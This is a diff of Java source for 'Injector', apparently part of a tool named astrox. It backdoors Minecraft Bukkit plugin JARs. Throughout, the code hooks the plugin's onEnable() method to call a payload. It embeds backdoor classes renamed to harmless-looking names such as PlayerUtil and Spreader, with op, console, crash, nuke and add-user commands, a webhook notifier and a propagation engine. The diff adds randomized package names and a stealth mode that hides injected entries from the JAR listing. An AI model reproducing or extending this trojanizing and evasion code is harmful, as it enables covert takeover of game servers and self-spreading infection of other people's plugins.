@@ -1,44 +1,88 @@
 package dev.naruto.astrox.core;
 
 import dev.naruto.astrox.Config;
+import dev.naruto.astrox.RuntimeConfig;
 import dev.naruto.astrox.obfuscation.ObfuscationEngine;
 import org.objectweb.asm.*;
+import org.objectweb.asm.commons.AdviceAdapter;
 import org.objectweb.asm.commons.ClassRemapper;
 import org.objectweb.asm.commons.SimpleRemapper;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
 import java.io.*;
-import java.util.HashMap;
-import java.util.Map;
+import java.util.*;
 import java.util.jar.*;
 import java.util.zip.*;
 
 /**
- * Main injection orchestrator
- * Coordinates JAR manipulation, payload embedding, and bytecode injection
+ * Main injection orchestrator.
+ * Coordinates JAR manipulation, payload embedding, and bytecode injection.
+ * Returns a {@link PipelineResult} with complete injection metadata.
  */
 public class Injector {
+
+    private static final Logger LOG = LoggerFactory.getLogger(Injector.class);
+
     private final File inputJar;
     private final File outputJar;
     private final ObfuscationEngine obfuscator;
+    private final boolean dryRun;
+    private final boolean stealthMode;
 
     public Injector(File inputJar, File outputJar) {
+        this(inputJar, outputJar, RuntimeConfig.dryRun, RuntimeConfig.stealthMode);
+    }
+
+    public Injector(File inputJar, File outputJar, boolean dryRun, boolean stealthMode) {
         this.inputJar = inputJar;
         this.outputJar = outputJar;
         this.obfuscator = new ObfuscationEngine(Config.OBFUSCATION_LEVEL);
+        this.dryRun = dryRun;
+        this.stealthMode = stealthMode;
     }
 
     /**
-     * Execute full injection pipeline
+     * Execute full injection pipeline.
+     *
+     * @return PipelineResult with complete injection metadata
      */
-    public void inject(JarAnalyzer analyzer, byte[] payloadBytes) throws Exception {
+    public PipelineResult inject(JarAnalyzer analyzer, byte[] payloadBytes) throws Exception {
+        PipelineResult.Builder result = new PipelineResult.Builder()
+                .originalJarPath(inputJar.getAbsolutePath())
+                .outputJarPath(outputJar.getAbsolutePath())
+                .pluginName(analyzer.getPluginName())
+                .version(analyzer.getVersion())
+                .mainClass(analyzer.getMainClass())
+                .javaVersion(analyzer.getJavaVersion())
+                .basePackage(analyzer.getBasePackage())
+                .dryRun(dryRun)
+                .stealthMode(stealthMode)
+                .encryptionKeyHex(Config.getEncryptionKeyHex());
+
         String mainClass = analyzer.getMainClass();
         String targetPackage = analyzer.getBasePackage() + ".internal.util";
 
-        // Build remapping table (old package → new package)
-        Map<String, String> remapTable = buildRemapTable(targetPackage);
+        // Build randomized remapping table
+        PayloadWeaver weaver = new PayloadWeaver(Config.OBFUSCATION_LEVEL);
+        weaver.generateRandomPackage();
+        Map<String, String> remapTable = weaver.buildRemapTable(
+                analyzer.getBasePackage().replace('.', '/'));
 
-        String payloadClass = targetPackage + ".PlayerUtil";
+        String payloadClass = weaver.getPayloadClassName().replace('/', '.');
+        Set<String> hiddenEntries = new LinkedHashSet<>();
 
-        System.out.println("[*] Target package: " + targetPackage);
+        LOG.info("Target package: {}", targetPackage);
+        LOG.debug("Payload class mapped to: {}", payloadClass);
+
+        if (dryRun) {
+            LOG.info("[DRY-RUN] Would inject into {} — skipping JAR output", inputJar.getName());
+            // Simulate: list what would be injected
+            for (Map.Entry<String, String> entry : remapTable.entrySet()) {
+                result.addInjectedClass(entry.getValue());
+            }
+            return result.build();
+        }
 
         try (JarFile jarFile = new JarFile(inputJar);
              JarOutputStream jos = new JarOutputStream(
@@ -60,17 +104,17 @@ public class Injector {
                                 .replace('/', '.');
 
                         if (className.equals(mainClass)) {
-                            // INJECT INTO MAIN CLASS
+                            // INJECT into main class using AdviceAdapter (AFTER original code)
                             byte[] originalBytes = readEntry(jarFile, entry);
-                            byte[] modifiedBytes = injectBootstrap(originalBytes, payloadClass);
+                            byte[] modifiedBytes = injectBootstrapAdvice(
+                                    originalBytes, payloadClass);
                             jos.write(modifiedBytes);
-                            System.out.println("[*] Injected bootstrap into: " + mainClass);
+                            LOG.info("Injected bootstrap into: {} (AdviceAdapter, post-onEnable)",
+                                    mainClass);
                         } else {
-                            // Copy other classes unchanged
                             copyEntry(jarFile, entry, jos);
                         }
                     } else {
-                        // Copy non-class files unchanged
                         copyEntry(jarFile, entry, jos);
                     }
 
@@ -81,99 +125,80 @@ public class Injector {
             });
 
             // Embed and remap payload classes
-            System.out.println("[*] Embedding payload classes...");
-            embedRemappedClasses(jos, remapTable);
+            LOG.info("Embedding payload classes...");
+            embedRemappedClasses(jos, remapTable, result, hiddenEntries);
 
-            System.out.println("[✓] Embedded all payload classes");
+            LOG.info("Embedded all payload classes ({} total)", result.getInjectedClasses().size());
         }
+
+        // Stealth post-processing: hide injected entries from Central Directory
+        if (stealthMode && !hiddenEntries.isEmpty()) {
+            LOG.info("Applying stealth patch — hiding {} entries from ZIP directory",
+                    hiddenEntries.size());
+            StealthPatcher patcher = new StealthPatcher(hiddenEntries);
+            if (!patcher.patch(outputJar)) {
+                result.addWarning("Stealth patching failed — entries remain visible in JAR listing");
+            }
+        }
+
+        return result.build();
     }
 
     /**
-     * Build remapping table: original package → target package
+     * Inject BackdoorCore.inject(this) using AdviceAdapter — called AFTER original onEnable() code.
+     * This preserves the original plugin functionality.
      */
-    private Map<String, String> buildRemapTable(String targetPackage) {
-        Map<String, String> map = new HashMap<>();
+    private byte[] injectBootstrapAdvice(byte[] classBytes, String payloadClassName) {
+        ClassReader reader = new ClassReader(classBytes);
+        ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);
 
-        String targetPath = targetPackage.replace('.', '/');
+        ClassVisitor visitor = new ClassVisitor(Opcodes.ASM9, writer) {
+            @Override
+            public MethodVisitor visitMethod(int access, String name,
+                                             String descriptor, String signature, String[] exceptions) {
+                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
 
-        // Remap core payload classes
-        map.put("dev/naruto/astrox/payload/BackdoorCore", targetPath + "/PlayerUtil");
-        map.put("dev/naruto/astrox/payload/CommandHandler", targetPath + "/ServerUtil");
-        map.put("dev/naruto/astrox/payload/AuthManager", targetPath + "/AccessControl");
-        map.put("dev/naruto/astrox/payload/PropagationEngine", targetPath + "/Spreader");
+                if (name.equals("onEnable") && descriptor.equals("()V")) {
+                    return new AdviceAdapter(Opcodes.ASM9, mv, access, name, descriptor) {
+                        @Override
+                        protected void onMethodExit(int opcode) {
+                            if (opcode == RETURN) {
+                                // Inject AFTER original code: BackdoorCore.inject(this);
+                                mv.visitVarInsn(ALOAD, 0);
+                                mv.visitMethodInsn(INVOKESTATIC,
+                                        payloadClassName.replace('.', '/'),
+                                        "inject",
+                                        "(Lorg/bukkit/plugin/java/JavaPlugin;)V",
+                                        false);
+                                LOG.debug("Inserted AdviceAdapter post-exit hook in onEnable()");
+                            }
+                        }
+                    };
+                }
 
-        // Remap config classes (IMPORTANT!)
-        map.put("dev/naruto/astrox/Config", targetPath + "/cfg/C");
-        map.put("dev/naruto/astrox/RuntimeConfig", targetPath + "/cfg/RC");
+                return mv;
+            }
+        };
 
-        // Remap command interface
-        map.put("dev/naruto/astrox/payload/commands/Command", targetPath + "/internal/Cmd");
-
-        // Original commands (single letter names)
-        map.put("dev/naruto/astrox/payload/commands/OpCommand", targetPath + "/internal/A");
-        map.put("dev/naruto/astrox/payload/commands/DeopCommand", targetPath + "/internal/B");
-        map.put("dev/naruto/astrox/payload/commands/GamemodeCommand", targetPath + "/internal/C");
-        map.put("dev/naruto/astrox/payload/commands/GiveCommand", targetPath + "/internal/D");
-        map.put("dev/naruto/astrox/payload/commands/ConsoleCommand", targetPath + "/internal/E");
-        map.put("dev/naruto/astrox/payload/commands/ChaosCommand", targetPath + "/internal/F");
-        map.put("dev/naruto/astrox/payload/commands/SeedCommand", targetPath + "/internal/G");
-        map.put("dev/naruto/astrox/payload/commands/AuthCommand", targetPath + "/internal/H");
-        map.put("dev/naruto/astrox/payload/commands/DeauthCommand", targetPath + "/internal/I");
-
-        // Enhanced commands
-        map.put("dev/naruto/astrox/payload/commands/FlyCommand", targetPath + "/internal/J");
-        map.put("dev/naruto/astrox/payload/commands/VanishCommand", targetPath + "/internal/K");
-        map.put("dev/naruto/astrox/payload/commands/HealCommand", targetPath + "/internal/L");
-        map.put("dev/naruto/astrox/payload/commands/KillCommand", targetPath + "/internal/M");
-        map.put("dev/naruto/astrox/payload/commands/SudoCommand", targetPath + "/internal/N");
-        map.put("dev/naruto/astrox/payload/commands/BroadcastCommand", targetPath + "/internal/O");
-        map.put("dev/naruto/astrox/payload/commands/FakeJoinCommand", targetPath + "/internal/P");
-        map.put("dev/naruto/astrox/payload/commands/FakeLeaveCommand", targetPath + "/internal/Q");
-        map.put("dev/naruto/astrox/payload/commands/KickCommand", targetPath + "/internal/R");
-        map.put("dev/naruto/astrox/payload/commands/CrashCommand", targetPath + "/internal/S");
-        map.put("dev/naruto/astrox/payload/commands/NukeCommand", targetPath + "/internal/T");
-        map.put("dev/naruto/astrox/payload/commands/HelpCommand", targetPath + "/internal/U");
-        map.put("dev/naruto/astrox/payload/commands/CoordsCommand", targetPath + "/internal/V");
-        map.put("dev/naruto/astrox/payload/commands/ListCommand", targetPath + "/internal/W");
-        map.put("dev/naruto/astrox/payload/commands/AddUserCommand", targetPath + "/internal/X");
-
-        // Remap utils
-        map.put("dev/naruto/astrox/utils/ReflectionUtil", targetPath + "/lib/ReflectUtil");
-        map.put("dev/naruto/astrox/utils/CryptoUtil", targetPath + "/lib/StringUtil");
-        map.put("dev/naruto/astrox/utils/Logger", targetPath + "/lib/LogUtil");
-        map.put("dev/naruto/astrox/utils/DebugLogger", targetPath + "/lib/DebugUtil");
-        map.put("dev/naruto/astrox/utils/DynamicLoader", targetPath + "/lib/Loader");
-        map.put("dev/naruto/astrox/utils/WebhookNotifier", targetPath + "/lib/Webhook");
-
-        // Remap core classes (for propagation)
-        map.put("dev/naruto/astrox/core/JarAnalyzer", targetPath + "/core/Analyzer");
-        map.put("dev/naruto/astrox/core/Injector", targetPath + "/core/Inject");
-        map.put("dev/naruto/astrox/core/PayloadWeaver", targetPath + "/core/Weaver");
-        map.put("dev/naruto/astrox/obfuscation/ObfuscationEngine", targetPath + "/core/Obf");
-
-        return map;
+        reader.accept(visitor, ClassReader.EXPAND_FRAMES);
+        return writer.toByteArray();
     }
 
-
     /**
-     * Embed all payload classes with package remapping
+     * Embed all payload classes with package remapping.
      */
-    private void embedRemappedClasses(JarOutputStream jos, Map<String, String> remapTable) throws IOException {
+    private void embedRemappedClasses(JarOutputStream jos, Map<String, String> remapTable,
+                                      PipelineResult.Builder result,
+                                      Set<String> hiddenEntries) throws IOException {
         String[] classes = {
-                // Core payload
                 "dev.naruto.astrox.payload.BackdoorCore",
                 "dev.naruto.astrox.payload.CommandHandler",
                 "dev.naruto.astrox.payload.AuthManager",
                 "dev.naruto.astrox.payload.PropagationEngine",
-
-                // Config classes
+                "dev.naruto.astrox.payload.BootstrapStub",
                 "dev.naruto.astrox.Config",
                 "dev.naruto.astrox.RuntimeConfig",
-
-                // Command interface
                 "dev.naruto.astrox.payload.commands.Command",
-
-                // All command implementations
                 "dev.naruto.astrox.payload.commands.OpCommand",
                 "dev.naruto.astrox.payload.commands.DeopCommand",
                 "dev.naruto.astrox.payload.commands.GamemodeCommand",
@@ -198,16 +223,12 @@ public class Injector {
                 "dev.naruto.astrox.payload.commands.CoordsCommand",
                 "dev.naruto.astrox.payload.commands.ListCommand",
                 "dev.naruto.astrox.payload.commands.AddUserCommand",
-
-                // Utilities
                 "dev.naruto.astrox.utils.ReflectionUtil",
                 "dev.naruto.astrox.utils.CryptoUtil",
                 "dev.naruto.astrox.utils.Logger",
                 "dev.naruto.astrox.utils.DebugLogger",
                 "dev.naruto.astrox.utils.DynamicLoader",
                 "dev.naruto.astrox.utils.WebhookNotifier",
-
-                // Core classes (for propagation)
                 "dev.naruto.astrox.core.JarAnalyzer",
                 "dev.naruto.astrox.core.Injector",
                 "dev.naruto.astrox.core.PayloadWeaver",
@@ -217,26 +238,29 @@ public class Injector {
         SimpleRemapper remapper = new SimpleRemapper(remapTable);
 
         for (String className : classes) {
-            embedRemappedClass(jos, className, remapper, remapTable);
+            embedRemappedClass(jos, className, remapper, remapTable, result, hiddenEntries);
         }
     }
 
     /**
-     * Load, remap, and embed a single class
+     * Load, remap, and embed a single class.
      */
     private void embedRemappedClass(JarOutputStream jos, String className,
-                                    SimpleRemapper remapper, Map<String, String> remapTable) throws IOException {
+                                    SimpleRemapper remapper, Map<String, String> remapTable,
+                                    PipelineResult.Builder result,
+                                    Set<String> hiddenEntries) throws IOException {
         String resourcePath = "/" + className.replace('.', '/') + ".class";
 
         try (InputStream is = getClass().getResourceAsStream(resourcePath)) {
             if (is == null) {
-                System.err.println("[!] Warning: Class not found: " + className);
+                LOG.warn("Class not found in resources: {}", className);
+                result.addWarning("Class not found: " + className);
                 return;
             }
 
             byte[] originalBytes = is.readAllBytes();
 
-            // Remap package using ASM
+            // Remap package using ASM ClassRemapper
             ClassReader reader = new ClassReader(originalBytes);
             ClassWriter writer = new ClassWriter(reader, 0);
             ClassVisitor remappingVisitor = new ClassRemapper(writer, remapper);
@@ -248,57 +272,22 @@ public class Injector {
             String oldPath = className.replace('.', '/');
             String newPath = remapTable.getOrDefault(oldPath, oldPath);
 
-            jos.putNextEntry(new ZipEntry(newPath + ".class"));
+            String entryName = newPath + ".class";
+            jos.putNextEntry(new ZipEntry(entryName));
             jos.write(remappedBytes);
             jos.closeEntry();
 
-            System.out.println("  [+] " + newPath + " (" + remappedBytes.length + " bytes)");
+            result.addInjectedClass(newPath);
+            if (stealthMode) {
+                hiddenEntries.add(entryName);
+            }
+
+            LOG.debug("  [+] {} ({} bytes)", newPath, remappedBytes.length);
         }
     }
 
     /**
-     * Inject BackdoorCore.inject(this) call into plugin's onEnable() method
-     */
-    private byte[] injectBootstrap(byte[] classBytes, String payloadClassName) {
-        ClassReader reader = new ClassReader(classBytes);
-        ClassWriter writer = new ClassWriter(reader, ClassWriter.COMPUTE_FRAMES | ClassWriter.COMPUTE_MAXS);
-
-        ClassVisitor visitor = new ClassVisitor(Opcodes.ASM9, writer) {
-            @Override
-            public MethodVisitor visitMethod(int access, String name,
-                                             String descriptor, String signature, String[] exceptions) {
-                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
-
-                // Hook into onEnable() method
-                if (name.equals("onEnable") && descriptor.equals("()V")) {
-                    return new MethodVisitor(Opcodes.ASM9, mv) {
-                        @Override
-                        public void visitCode() {
-                            super.visitCode();
-
-                            // Inject at START of method: BackdoorCore.inject(this);
-                            mv.visitVarInsn(Opcodes.ALOAD, 0); // Load 'this'
-                            mv.visitMethodInsn(
-                                    Opcodes.INVOKESTATIC,
-                                    payloadClassName.replace('.', '/'),
-                                    "inject",
-                                    "(Lorg/bukkit/plugin/java/JavaPlugin;)V",
-                                    false
-                            );
-                        }
-                    };
-                }
-
-                return mv;
-            }
-        };
-
-        reader.accept(visitor, ClassReader.EXPAND_FRAMES);
-        return writer.toByteArray();
-    }
-
-    /**
-     * Read JAR entry bytes
+     * Read JAR entry bytes.
      */
     private byte[] readEntry(JarFile jar, JarEntry entry) throws IOException {
         try (InputStream is = jar.getInputStream(entry)) {
@@ -307,7 +296,7 @@ public class Injector {
     }
 
     /**
-     * Copy JAR entry unchanged
+     * Copy JAR entry unchanged.
      */
     private void copyEntry(JarFile jar, JarEntry entry, JarOutputStream jos) throws IOException {
         try (InputStream is = jar.getInputStream(entry)) {
